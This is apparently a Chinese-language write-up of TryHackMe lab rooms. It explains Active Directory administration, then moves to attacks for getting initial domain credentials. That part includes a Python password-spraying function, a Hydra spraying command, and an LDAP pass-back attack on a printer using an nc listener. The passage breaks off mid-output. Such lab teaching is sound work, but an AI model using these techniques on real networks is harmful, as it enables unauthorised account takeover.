的 Active Directory 是企业界的支柱。它简化了企业环境中的设备和用户的管理</p><p>想象一下，您管理着一个只有五台计算机和五名员工的小型企业网络。在这样一个小型网络中，您可能能够毫无问题地单独配置每台计算机。您将手动登录每台计算机，为使用它们的任何人创建用户，并为每个员工的帐户进行特定配置。如果用户的计算机停止工作，您可能会去他们那里并现场修理计算机。</p><p>虽然这听起来是一种非常轻松的生活方式，但假设您的业务突然发展壮大，现在拥有 157 台计算机和 320 个不同的用户，分布在四个不同的办公室。您是否仍然能够将每台计算机作为单独的实体进行管理，为网络中的每个用户手动配置策略，并为每个人提供现场支持？答案很可能是否定的。</p><p>为了克服这些限制，我们可以使用 Windows 域。简而言之，<strong>Windows 域</strong>是受特定企业管理的一组用户和计算机。域背后的主要思想是将 Windows 计算机网络的通用组件的管理集中在一个称为<strong>Active Directory ( AD )<strong>的单一存储库中。运行 Active Directory 服务的服务器称为</strong>域控制器 ( DC )</strong>。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/bebe5dfec0208bf563d01fa2dd1fb7a7.png" alt="Windows 域概述"></p><p>配置 Windows 域的主要优点是：</p><ul><li>**集中身份管理：**可以轻松从 Active Directory 配置整个网络中的所有用户。</li><li>**管理安全策略：**您可以直接从 Active Directory 配置安全策略，并根据需要将其应用于网络上的用户和计算机。</li></ul><p><strong>Active Directory</strong></p><p>任何 Windows 域的核心都是<strong>Active Directory 域服务 ( AD DS)</strong>。此服务充当目录，其中包含网络上存在的所有“对象”的信息。在 AD 支持的许多对象中，我们有用户、组、机器、打印机、共享和许多其他对象。让我们看看其中的一些：</p><p>*<strong>用户*</strong></p><p><strong>用户是 Active Directory 中最常见的对象类型之一。用户是称为安全主体</strong>的对象之一，这意味着他们可以通过域进行身份验证，并可以分配对文件或打印机等<strong>资源</strong>的权限。您可以说安全主体是可以对网络中的资源采取行动的对象。</p><p>用户可以用来表示两种类型的实体：</p><ul><li>**人员：**用户通常代表组织中需要访问网络的人员，例如员工。</li><li>**服务：**您还可以定义 IIS 或 MSSQL 等服务所使用的用户。每项服务都需要用户运行，但服务用户与普通用户不同，因为他们只具有运行特定服务所需的权限。</li></ul><p>*<strong>机器*</strong></p><p>计算机是 Active Directory 中的另一种对象；对于加入 Active Directory 域的每台计算机，都会创建一个计算机对象。计算机也被视为“安全主体”，并像任何普通用户一样被分配一个帐户。此帐户在域内具有有限的权限。</p><p>机器帐户本身是指定计算机上的本地管理员，通常不应由计算机本身以外的任何人访问，但与任何其他帐户一样，如果您有密码，则可以使用它登录。</p><p><strong>注意：</strong> 机器账户密码会自动轮换，一般由120个随机字符组成。</p><p>识别机器帐户相对容易。它们遵循特定的命名方案。机器帐户名称是计算机的名称后跟美元符号。例如，名为的机器<code>DC01</code>将有一个名为的机器帐户<code>DC01$</code>。</p><p>*<strong>安全组*</strong></p><p>如果您熟悉 Windows，您可能知道您可以定义用户组，将文件或其他资源的访问权限分配给整个组而不是单个用户。这可以提高可管理性，因为您可以将用户添加到现有组，并且他们将自动继承该组的所有权限。安全组也被视为安全主体，因此可以对网络上的资源拥有特权。</p><p>组可以同时包含用户和机器作为成员。如果需要，组还可以包含其他组。</p><p>域中默认创建了几个组，可用于向用户授予特定权限。例如，以下是域中一些最重要的组：</p><table><thead><tr><th><strong>安全组</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>Domain Admins</td><td>该组的用户拥有整个域的管理权限。默认情况下，他们可以管理域中的任何计算机，包括 DC。</td></tr><tr><td>Server Operators</td><td>此组中的用户可以管理域控制器。他们无法更改任何管理组成员身份。</td></tr><tr><td>Backup Operators</td><td>此组中的用户可以访问任何文件，而不受其权限的限制。它们用于在计算机上执行数据备份。</td></tr><tr><td>Account Operators</td><td>该组中的用户可以创建或修改域中的其他帐户。</td></tr><tr><td>Domain Users</td><td>包括域中所有现有的用户帐户。</td></tr><tr><td>Domain Computers</td><td>包括域中所有现有的计算机。</td></tr><tr><td>Domain Controllers</td><td>包括域中所有现有的 DC。</td></tr></tbody></table><p><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups">您可以从Microsoft 文档</a>中获取默认安全组的完整列表。</p><ul><li><strong>Active Directory Users and Computers</strong></li></ul><p>要在 Active Directory 中配置用户、组或机器，我们需要登录到域控制器并从开始菜单运行&quot;Active Directory Users and Computers&quot;</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/11d01963392078c1450300d2881f9160.png" alt="开始菜单 AD 用户和计算机"></p><p>这将打开一个窗口，您可以在其中看到域中存在的用户、计算机和组的层次结构。这些对象组织在**组织单位 (OU)**中，组织单位是容器对象，允许您对用户和机器进行分类。OU 主要用于定义具有类似监管要求的用户集。例如，您组织销售部门的人员可能与 IT 部门的人员应用不同的政策集。请记住，用户一次只能属于一个OU 。</p><p>检查我们的机器，我们可以看到已经有一个OU ——<code>THM</code>，它有四个子 OU ，分别用于 IT、管理、营销和销售部门。OU 模仿业务结构是很常见的，因为它允许高效地部署适用于整个部门的基线策略。请记住，虽然这在大多数情况下是预期的模型，但您可以任意定义 OU。您可以随意右键单击 OU<code>THM</code> 并在其下创建一个新的OU<code>Students</code></p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c5b1d321108bc065771eba62d24f5e83.png" alt="AD 用户和计算机"></p><p>如果您打开任何 OU，您可以看到其中包含的用户，并根据需要执行创建、删除或修改等简单任务。您还可以根据需要重置密码</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/76e01efece5a00cc91f7099226130c5c.png" alt="IT 部门 OU"></p><p>您可能已经注意到，除了 THM OU之外，还有其他默认容器。这些容器由 Windows 自动创建，包含以下内容：</p><ul><li><p><strong>Builtin</strong>（内置）：包含任何 Windows 主机可用的默认组。</p></li><li><p><strong>Computers</strong>（计算机）：任何加入网络的机器都会默认放在这里。您可以根据需要移动它们。</p></li><li><p><strong>Domain Controllers</strong>（域控制器）：包含网络中的 DC 的默认OU 。</p></li><li><p><strong>Users</strong>（用户）：适用于域范围上下文的默认用户和组。</p></li><li><p><strong>Managed Service Accounts</strong>（托管服务帐户）：保存 Windows 域中的服务使用的帐户。</p></li><li><p><strong>安全组与 OU</strong></p></li></ul><p>您可能想知道为什么我们同时拥有组和 OU。虽然两者都用于对用户和计算机进行分类，但它们的用途完全不同：</p><ul><li><strong>OU</strong>可以方便地 <strong>将策略</strong>应用于用户和计算机，其中包括根据用户在企业中的特定角色而适用于用户组的特定配置。请记住，用户一次只能成为一个 OU 的成员，因为尝试将两组不同的策略应用于单个用户是没有意义的。</li><li>另一方面，安全组用于<strong>授予对资源的权限</strong>。例如，如果您想允许某些用户访问共享文件夹或网络打印机，则可以使用组。用户可以是多个组的一部分，这是授予对多个资源的访问权限所必需的。</li></ul><h5 id="在ad中管理用户">在AD中管理用户</h5><ul><li><strong>删除多余的 OU 和用户</strong></li></ul><p>尝试右键单击并删除该OU，您将收到以下错误：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/38edaf4a8665c257c62556096c69cb6f.png" alt="OU 删除错误"></p><p>默认情况下，OU 受到保护，以免意外删除。要删除 OU ，我们需要在“查看”菜单中启用**“高级功能” ：**</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/15b282b6e3940f4c26c477a8c21f8266.png" alt="启用高级功能"></p><p>这将向您显示一些其他容器，并使您能够禁用意外删除保护。为此，右键单击 OU并转到属性。您将在“对象”选项卡中找到一个复选框以禁用保护：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/ad6b6d886c0448d14ce4ec8c62250256.png" alt="禁用 OU 删除保护"></p><p>确保取消选中该复选框，然后再次尝试删除OU。系统将提示您确认是否要删除OU，因此，其下的任何用户、组或 OU 也将被删除。</p><ul><li><strong>委派</strong></li></ul><p>在AD中，您可以做的一件好事就是让特定用户对某些 OU 进行一些控制。这个过程称为<strong>委派</strong> ，允许您授予用户特定权限，让他们对 OU 执行高级任务，而无需域管理员介入。</p><p>最常见的用例之一是授予<code>IT support</code>重置其他低权限用户密码的权限。根据我们的组织结构图，Phillip 负责 IT 支持，因此我们可能希望将重置销售、营销和管理 OU 密码的控制权委托给他。</p><p>在此示例中，我们将销售OU 的控制权委托给 Phillip。要委托某个OU 的控制权，您可以右键单击它并选择<strong>委托控制</strong>：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/74f8d615658a03aeb1cfdb6767d0a0a3.png" alt="委派 OU 控制"></p><p>这将打开一个新窗口，首先会询问您要委派控制权的用户：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2814715e1dbadaef334973028e02da69.png" alt="将销售 OU 委托给 Phillip"></p><blockquote><p>为了避免输入错误用户名，请输入“phillip”并单击**“检查姓名”**按钮。Windows 将自动为您填写用户。</p></blockquote><p>单击“确定”，然后在下一步中选择以下选项：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/3f81df2b38e35ca5729aee7a76c6b220.png" alt="委托密码重置"></p><p>单击下一步几次，现在 Phillip 应该能够为销售部门的任何用户重置密码。</p><p>登录Phillip账户测试委派是否生效</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\phillip&gt; <span class="built_in">Set-ADAccountPassword</span> sophie <span class="literal">-Reset</span> <span class="literal">-NewPassword</span> (<span class="built_in">Read-Host</span> <span class="literal">-AsSecureString</span> <span class="literal">-Prompt</span> <span class="string">&#x27;New Password&#x27;</span>) <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line">New Password: *********</span><br><span class="line"></span><br><span class="line">VERBOSE: Performing the operation <span class="string">&quot;Set-ADAccountPassword&quot;</span> on target <span class="string">&quot;CN=Sophie,OU=Sales,OU=THM,DC=thm,DC=local&quot;</span>.</span><br></pre></td></tr></table></figure><p>由于我们不希望 Sophie 继续使用我们知道的密码，我们还可以在下次登录时使用以下命令强制重置密码：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\phillip&gt; <span class="built_in">Set-ADUser</span> <span class="literal">-ChangePasswordAtLogon</span> <span class="variable">$true</span> <span class="literal">-Identity</span> sophie <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line">VERBOSE: Performing the operation <span class="string">&quot;Set&quot;</span> on target <span class="string">&quot;CN=Sophie,OU=Sales,OU=THM,DC=thm,DC=local&quot;</span>.</span><br></pre></td></tr></table></figure><h5 id="在ad中管理计算机">在AD中管理计算机</h5><p>默认情况下，加入域的所有计算机（DC 除外）都将放入名为“Computers”的容器中。如果我们检查 DC ，我们将看到一些设备已经在那里：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a1d41d5437e73d62ede10f2015dc4dfc.png" alt="计算机开放大学"></p><p>我们可以看到一些服务器、一些笔记本电脑和一些 PC，它们与我们网络中的用户相对应。将所有设备都放在那里并不是最好的主意，因为您很可能希望对服务器和普通用户每天使用的机器采用不同的策略。</p><p>虽然没有关于如何组织机器的黄金法则，但一个很好的起点是根据设备的用途对其进行分类。一般来说，您会看到设备至少分为以下三个类别：</p><p><strong>1.工作站</strong></p><p>工作站是 Active Directory 域中最常见的设备之一。域中的每个用户都可能登录工作站。这是他们用来工作或进行正常浏览活动的设备。这些设备绝不应该有特权用户登录。</p><p><strong>2. 服务器</strong></p><p>服务器是 Active Directory 域中第二常见的设备。服务器通常用于向用户或其他服务器提供服务。</p><p><strong>3. 域控制器</strong></p><p>域控制器是 Active Directory 域中第三大最常见的设备。域控制器允许您管理 Active Directory 域。这些设备通常被视为网络中最敏感的设备，因为它们包含环境中所有用户帐户的哈希密码。</p><p>由于我们正在整理 AD，因此让我们为<code>Workstations</code>和<code>Servers</code>创建两个单独的 OU （域控制器已位于Windows 创建的OU中）。我们将直接在域容器<code>thm.local</code>下创建它们。最后，您应该具有以下OU结构：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/09405010962071f21c6dee7b4eb8c59a.png" alt="最终 OU 结构"></p><p>现在，将个人计算机和笔记本电脑从计算机容器移至工作站OU，将服务器移至服务器OU 。这样做将允许我们稍后为每个OU配置策略。</p><h5 id="组策略">组策略</h5><p>到目前为止，我们只是出于方便的目的将用户和计算机组织在 OU 中，但其背后的主要思想是能够为每个OU单独部署不同的策略。这样，我们就可以根据用户所在的部门向他们推送不同的配置和安全基准。</p><p>Windows 通过**组策略对象 ( GPO )**管理此类策略。GPO 只是可应用于 OU 的设置集合。GPO 可以包含针对用户或计算机的策略，允许您为特定机器和身份设置基线。</p><p>要配置 GPO，您可以使用开始菜单中的<strong>组策略管理工具：</strong></p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b19052c41e27fbbb2651038cede63e11.png" alt="开始菜单 GPM"></p><p>打开它时，您首先会看到完整的OU层次结构，如前所述。要配置组策略，首先在<strong>组策略对象</strong>下创建一个GPO ，然后将其链接到要应用策略的OU。例如，您可以看到您的计算机中已经存在一些 GPO：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d82cb9440894c831f6f3d58a2b0538ed.png" alt="您计算机中的现有 OU"></p><p>我们在上图中可以看到已创建了 3 个 GPO。其中<code>RDP Policy</code> 和<code>Default Domain Policy</code>链接到<code>thm.local</code>整个域，<code>Default Domain Controllers Policy</code>仅链接到<code>Domain Controllers</code> OU。需要注意的是，任何 GPO 都将应用于链接的OU及其下的任何子 OU。例如，<code>Sales</code> OU仍将受到<code>Default Domain Policy</code>的影响。</p><p>让我们检查一下<code>Default Domain Policy</code>GPO 里面有什么。选择 GPO 时看到的第一个选项卡显示其<strong>范围</strong>，即 GPO 在AD中的链接位置。对于当前策略，我们可以看到它仅链接到域<code>thm.local</code>：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/06d5e70fbfa648f73e4598e18c8e9527.png" alt="OU 范围"></p><p>如您所见，您还可以将<strong>安全过滤</strong>应用于 GPO，以便它们仅应用于OU下的特定用户/计算机。默认情况下，它们将应用于<strong>经过身份验证的用户</strong>组，其中包括所有用户/ PC。</p><p>**“设置”**选项卡包含GPO的实际内容，并让我们知道它应用了哪些具体配置。如前所述，每个GPO都有仅适用于计算机的配置和仅适用于用户的配置。在本例中，<code>Default Domain Policy</code>仅包含计算机配置：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c9293853549d5126b77bf2de8086e076.png" alt="OU 设置"></p><p>您可以随意浏览 GPO，并使用每个配置右侧的“显示”链接展开可用项目。在本例中，表示<code>Default Domain Policy</code>适用于大多数域的基本配置，包括密码和帐户锁定策略：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a5f4c2605062934579c64f2cfa025308.png" alt="OU 详细设置"></p><p>由于此 GPO 适用于整个域，因此对它的任何更改都会影响所有计算机。让我们更改最小密码长度策略，要求用户的密码至少包含 10 个字符。为此，右键单击 GPO并选择<strong>编辑</strong>：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b71d8de9e74d129d0ad4142863deadc4.png" alt="编辑 GPO 设置"></p><p>这将打开一个新窗口，我们可以在其中浏览和编辑所有可用的配置。要更改最小密码长度，请转到<code>Computer Configurations -&gt; Policies -&gt; Windows Setting -&gt; Security Settings -&gt; Account Policies -&gt; Password Policy</code>并更改所需的策略值：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/bd3665c2569aa8fbe4f7482a5750f018.png" alt="密码策略 GPO"></p><p>如您所见，可以在GPO中建立许多策略。虽然不可能在一个房间里解释每一项策略，但您可以随意探索一下，因为有些策略很简单。如果需要有关任何策略的更多信息，您可以双击它们并阅读每个策略的**“解释”选项卡：**</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/de35e7c03fafcb5b9df5457181e32652.png" alt="OU 设置说明选项卡"></p><ul><li><strong>GPO分发</strong></li></ul><p>GPO 通过名为 的网络共享分发到网络<code>SYSVOL</code>，该共享存储在DC中。域中的所有用户通常都应能够通过网络访问此共享，以定期同步其 GPO。SYSVOL 共享默认指向<code>C:\Windows\SYSVOL\sysvol\</code>我们网络中每个 DC 上的目录。</p><p>一旦对任何 GPO 进行了更改，计算机可能需要长达 2 小时才能跟上。如果您想强制任何特定计算机立即同步其 GPO，您可以随时在所需的计算机上运行以下命令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; gpupdate /force</span><br></pre></td></tr></table></figure><p>示例——创建一些GPO</p><ol><li>阻止非 IT 用户访问控制面板。</li><li>让工作站和服务器在用户 5 分钟不活动后自动锁定屏幕，以避免人们暴露他们的会话。</li></ol><ul><li><em>限制对控制面板的访问</em></li></ul><p>我们希望将所有机器上的控制面板访问权限限制为仅属于 IT 部门的用户。其他部门的用户不应能够更改系统的首选项。</p><p>让我们创建一个名为的新GPO<code>Restrict Control Panel Access</code>并打开它进行编辑。由于我们希望此GPO应用于特定用户，我们将查找<code>User Configuration</code>以下策略：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9b333a11d12f05dd4413e3f208aab363.png" alt="限制对控制面板的访问"></p><p>请注意，我们已启用<strong>禁止访问控制面板和PC设置</strong>策略。</p><p>配置 GPO 后，我们需要将其链接到所有与不应有权访问其 PC 控制面板的用户相对应的 OU。在本例中，我们将通过将GPO拖到每个 OU 来链接<code>Marketing</code>、<code>Management</code>和<code>Sales</code></p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/4a8f727788731b7fbf87fc079682d1a6.png" alt="链接限制控制面板 GPO"></p><ul><li><em>自动锁屏</em></li></ul><p>于工作站和服务器的屏幕锁定，我们可以直接将其应用于我们之前创建的<code>Workstations</code>、<code>Servers</code>，但另一种方法是将 GPO 简单地应用于根域，因为我们希望 GPO影响我们所有的计算机。由于<code>Workstations</code>、<code>Servers</code>和<code>Domain Controllers</code>OU 都是根域的子 OU，因此它们将继承其策略。</p><blockquote><p>如果我们的GPO应用于根域，它也将被其他 OU（如<code>Sales</code>或 ）继承。由于这些 OU 仅包含用户，因此我们的GPO中的任何计算机配置都将被它们忽略。</p></blockquote><p>让我们创建一个新的GPO，命名它<code>Auto Lock Screen</code>，然后编辑它。实现我们想要的策略位于以下路由中：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/44c0cde18837cb6333c78749356ac0ee.png" alt="配置机器不活动限制"></p><p>我们将不活动限制设置为 5 分钟，这样如果任何用户保持其会话打开，计算机就会自动锁定。关闭GPO编辑器后，我们将通过将GPO拖到根域来将GPO链接到根域：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/fcfc77d126991ffee8c927202b4dde37.png" alt="链接自动锁屏 GPO"></p><h5 id="身份验证方法">身份验证方法</h5><p>使用 Windows 域时，所有凭据都存储在域控制器中。每当用户尝试使用域凭据向服务进行身份验证时，该服务都需要请求域控制器验证它们是否正确。Windows 域中的网络身份验证可以使用两种协议：</p><ul><li>**Kerberos：**任何较新版本的 Windows 均使用此协议。这是任何较新域中的默认协议。</li><li>**NetNTLM：**为了兼容性目的而保留的旧式身份验证协议。</li></ul><h4 id="ad域攻击">AD域攻击</h4><p>全球财富 1000 强公司中约有 90% 使用 Active Directory (AD)。如果某个组织的资产使用 Microsoft Windows，那么您几乎肯定会找到AD。Microsoft AD是用于管理 Windows 域网络的主要套件。但是，由于AD用于整个资产的身份和访问管理，因此它掌握着整个资产的钥匙，因此它很可能成为攻击者的目标。</p><p>在我们利用AD错误配置进行权限提升、横向移动和目标执行之前，您需要先获得初始访问权限。您需要获取一组初始的有效AD凭据。由于AD服务和功能的数量众多，获取一组初始AD凭据的攻击面通常很大。在这个房间里，我们将讨论几种途径，但这绝不详尽。</p><p>在寻找第一组凭据时，我们不会关注与帐户相关的权限；因此，即使是低权限帐户也足够了。我们只是在寻找一种对AD进行身份验证的方法，以便我们对AD本身进行进一步枚举。</p><p>我们将介绍以下技术来恢复此网络中的AD凭据：</p><ul><li>NTLM认证服务</li><li>LDAP 绑定凭证</li><li>身份验证中继</li><li>Microsoft 部署工具包</li><li>配置文件</li></ul><p>1、<strong>OSINT和网络钓鱼</strong></p><p>获取第一组 AD 凭据的两种流行方法，具体方法不赘述</p><p>2、<strong>NTLM认证服务</strong></p><p>新技术 LAN 管理器 (NTLM) 是用于在AD中验证用户身份的安全协议套件。NTLM可通过使用名为NetNTLM的质询-响应方案进行身份验证。网络上的服务大量使用此身份验证机制。但是，使用 NetNTLM 的服务也可能暴露在互联网上。以下是一些常见示例：</p><ul><li>内部托管的 Exchange（邮件）服务器，公开 Outlook Web App (OWA) 登录门户。</li><li>暴露给互联网的服务器的远程桌面协议 ( RDP ) 服务。</li><li>暴露与AD集成的 VPN 端点。</li><li>面向互联网并使用 NetNTLM 的 Web 应用程序。</li></ul><p>NetNTLM，也常被称为 Windows 身份验证或 NTLM 身份验证，允许应用程序扮演客户端和AD之间的中间人角色。所有身份验证材料都以质询的形式转发到域控制器，如果成功完成，应用程序将对用户进行身份验证。</p><p>这意味着应用程序代表用户进行身份验证，而不是直接在应用程序本身上对用户进行身份验证。这可以防止应用程序存储AD凭据，这些凭据只能存储在域控制器上。此过程如下图所示：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c9113ad0ff443dd0973736552e85aa69.png" alt="img"></p><p>暴力登录攻击</p><p>如任务 2 中所述，这些公开的服务为测试使用其他方式发现的凭据提供了绝佳的位置。但是，这些服务也可以直接用于尝试恢复一组初始的有效AD凭据。如果我们在初始红队侦察期间恢复了有效电子邮件地址等信息，我们或许可以尝试使用这些服务进行暴力攻击。</p><p>由于大多数 AD 环境都配置了帐户锁定，因此我们无法运行完整的暴力攻击。相反，我们需要执行密码喷洒攻击。我们不会尝试多个不同的密码（这可能会触发帐户锁定机制），而是选择并使用一个密码并尝试使用我们获得的所有用户名进行身份验证。但是，应该注意的是，由于这些类型的攻击会产生大量失败的身份验证尝试，因此可以检测到它们。</p><p><a href="https://github.com/vanhauser-thc/thc-hydra">我们可以使用Hydra</a>等工具来协助密码喷洒攻击。但是，自己编写这些类型的攻击脚本通常更好，这样可以让你更好地控制整个过程。任务文件中提供了一个可用于密码喷洒攻击的基本 Python 脚本。以下函数是脚本的主要组成部分：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">password_spray</span>(<span class="params">self, password, url</span>):</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;[*] Starting passwords spray attack using the following password: &quot;</span> + password)</span><br><span class="line">    <span class="comment">#Reset valid credential counter</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="comment">#Iterate through all of the possible usernames</span></span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> self.users:</span><br><span class="line">        <span class="comment">#Make a request to the website and attempt Windows Authentication</span></span><br><span class="line">        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + <span class="string">&quot;\\&quot;</span> + user, password))</span><br><span class="line">        <span class="comment">#Read status code of response to determine if authentication was successful</span></span><br><span class="line">        <span class="keyword">if</span> (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;[+] Valid credential pair found! Username: &quot;</span> + user + <span class="string">&quot; Password: &quot;</span> + password)</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (self.verbose):</span><br><span class="line">            <span class="keyword">if</span> (response.status_code == self.HTTP_AUTH_FAILED_CODE):</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;[-] Failed login with Username: &quot;</span> + user)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;[*] Password spray attack completed, &quot;</span> + <span class="built_in">str</span>(count) + <span class="string">&quot; valid credential pairs found&quot;</span>)</span><br></pre></td></tr></table></figure><p>此函数将我们建议的密码和我们定位的 URL 作为输入，并尝试使用文本文件中的每个用户名对该 URL 进行身份验证。通过监控应用程序的HTTP响应代码的差异，我们可以确定凭证对是否有效。如果凭证对有效，应用程序将以 200 HTTP（OK）代码响应。如果凭证对无效，应用程序将返回 401 HTTP（未授权）代码。</p><blockquote><p>也可以使用Hydra</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -I -V -L ./usernames.txt -p <span class="string">&#x27;Changeme123&#x27;</span> ntlmauth.za.tryhackme.com http-get <span class="string">&#x27;/:A=NTLM:F=401&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>3、<strong>LDAP绑定凭证</strong></p><p>应用程序可以使用的另一种 AD 身份验证方法是轻量级目录访问协议 (LDAP) 身份验证。LDAP 身份验证类似于 NTLM 身份验证。但是，使用 LDAP 身份验证，应用程序会直接验证用户的凭据。应用程序有一对 AD 凭据，可以先使用这些凭据查询 LDAP，然后验证 AD 用户的凭据。</p><p>LDAP 身份验证是与AD集成的第三方（非 Microsoft）应用程序的一种流行机制。这些应用程序和系统包括:</p><ul><li>Gitlab</li><li>Jenkins</li><li>定制开发的 Web 应用程序</li><li>打印机</li><li>VPNs</li></ul><p>如果任何这些应用程序或服务暴露在互联网上，那么就可以使用与针对 NTLM 身份验证系统相同类型的攻击。但是，由于使用 LDAP 身份验证的服务需要一组AD凭据，因此它开辟了额外的攻击途径。本质上，我们可以尝试恢复服务使用的AD凭据以获得对AD 的身份验证访问权限。通过 LDAP 进行身份验证的过程如下所示：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d2f78ae2b44ef76453a80144dac86b4e.png" alt="img"></p><p>如果您可以在正确的主机（例如 Gitlab 服务器）上立足，那么只需读取配置文件即可恢复这些AD凭据。这些凭据通常以纯文本形式存储在配置文件中，因为安全模型依赖于确保位置和存储配置文件的安全，而不是其内容的安全。</p><p><strong>LDAP 回传攻击</strong></p><p>但是，还有一种非常有趣的攻击可以针对 LDAP 身份验证机制，称为 LDAP 回传攻击。当您获得对内部网络的初始访问权限时，例如在会议室中插入恶意设备，这是一种针对网络设备（如打印机）的常见攻击。</p><p>当我们获得指定 LDAP 参数的设备配置访问权限时，就可以执行 LDAP 回传攻击。例如，这可以是网络打印机的 Web 界面。通常，这些界面的凭据保持为默认值，例如<code>admin:admin</code>或<code>admin:password</code>。在这里，我们无法直接提取 LDAP 凭据，因为密码通常是隐藏的。但是，我们可以更改 LDAP 配置，例如 LDAP 服务器的 IP 或主机名。在 LDAP 回传攻击中，我们可以将此 IP 修改为我们的 IP，然后测试 LDAP 配置，这将强制设备尝试对我们的恶意设备进行 LDAP 身份验证。我们可以拦截此身份验证尝试以恢复 LDAP 凭据。</p><p>此网络中有一台网络打印机，管理网站不需要凭据。</p><p>：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/b2ab520a2601299ed9bf74d50168ca7d.png" alt="img"></p><p>使用浏览器检查，我们还可以验证打印机网站至少足够安全，不会将 LDAP 密码发送回浏览器：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c7cfe0419d3ebe9534d4caefcd1a5511.png" alt="img"></p><p>因此，我们有用户名，但没有密码。但是，当我们按下测试设置时，我们可以看到向域控制器发出了身份验证请求以测试 LDAP 凭据。让我们尝试利用这一点让打印机连接到我们，这将泄露凭据。为此，让我们使用一个简单的 Netcat 侦听器来测试我们是否可以让打印机连接到我们。由于 LDAP 的默认端口是 389，我们可以使用以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 389</span><br></pre></td></tr></table></figure><p>连接建立</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[thm@thm]$ nc -lvp 389</span><br><span class="line">listening on 